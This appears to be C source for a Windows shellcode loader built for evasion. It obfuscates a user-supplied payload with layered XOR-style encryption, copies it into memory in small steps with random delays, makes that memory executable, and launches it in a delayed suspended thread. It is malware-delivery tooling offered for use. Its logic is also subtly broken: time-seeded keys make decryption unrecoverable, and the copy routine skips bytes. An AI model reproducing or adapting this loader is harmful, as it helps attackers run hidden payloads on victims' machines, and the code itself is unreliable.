#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <time.h>
#define SECRET 1
void XOREncrypt(unsigned char *data, size_t len)
{
    srand(SECRET ^ GetTickCount());
    for (size_t i = 0; i < len; i++)
    {
        data[i] += i;
        data[i] ^= (rand() % 256);
    }
    for (size_t i = 1; i <= len / 2; i++)
    {
        size_t j = ((i - 1) * 7) % len;
        unsigned char temp = data[i - 1];
        data[i - 1] = data[j];
        data[j] = temp;
    }
    for (size_t i = 0; i < len; i++)
    {
        data[i] = (data[i] * 171) % 256;
        data[i] = (data[i] + 17) % 256;
    }
    unsigned char time_key = generate_key();
    for (size_t i = 0; i < len; i++)
    {
        data[i] ^= (time_key + i);
    }
}
unsigned char generate_key()
{
    return (unsigned char)((GetTickCount() ^ SECRET) & 0xFF);
}

void decrypt(unsigned char *data, size_t len)
{
    unsigned char time_key = generate_key();
    for (size_t i = 0; i < len; i++)
    {
        data[i] ^= (time_key + i);
    }
    for (size_t i = 0; i < len; i++)
    {
        data[i] = (data[i] - 17 + 256) % 256;
        data[i] = (data[i] * 171) % 256;
    }
    for (size_t i = len / 2; i > 0; i--)
    {
        size_t j = ((i - 1) * 7) % len;
        unsigned char temp = data[i - 1];
        data[i - 1] = data[j];
        data[j] = temp;
    }
    srand(SECRET ^ GetTickCount());
    for (size_t i = 0; i < len; i++)
    {
        data[i] ^= (rand() % 256);
        data[i] -= i;
    }
}

void stealthy_copy(void *dest, const void *src, size_t n)
{
    volatile uint8_t *d = (volatile uint8_t *)dest;
    const uint8_t *s = (const uint8_t *)src;
    size_t step = (rand() % 5) + 1;
    for (size_t i = 0; i < n; i += step)
    {
        d[i] = s[i];
        Sleep((GetTickCount() % 15) ^ (rand() % 10));
    }
}

int main()
{
    srand((unsigned int)time(NULL) ^ GetTickCount());
    unsigned char encrypted_shellcode[] = ""; // You need to enter your shellcode which is encrypted with XOR algorithm. You can use XOREncrypt function for this.
    size_t shellcode_len = sizeof(encrypted_shellcode) - 1;
    decrypt(encrypted_shellcode, shellcode_len);
    size_t alloc_size = shellcode_len + (rand() % 128);
    LPVOID exec_mem = VirtualAlloc(NULL, alloc_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (exec_mem == NULL)
    {
        return -1;
    }
    stealthy_copy(exec_mem, encrypted_shellcode, shellcode_len);
    DWORD old_protect;
    if (!VirtualProtect(exec_mem, alloc_size, PAGE_EXECUTE_READ, &old_protect))
    {
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        return -1;
    }
    HANDLE thread = CreateThread(NULL, rand() % 2048, (LPTHREAD_START_ROUTINE)exec_mem, NULL, CREATE_SUSPENDED, NULL);
    if (thread == NULL)
    {
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        return -1;
    }
    Sleep((GetTickCount() % 700) ^ (rand() % 400));
    ResumeThread(thread);
    while (WaitForSingleObject(thread, (rand() % 75) + 25) == WAIT_TIMEOUT)
    {
        Sleep((GetTickCount() % 150));
    }
    VirtualFree(exec_mem, 0, MEM_RELEASE);
    CloseHandle(thread);
    return 0;
}
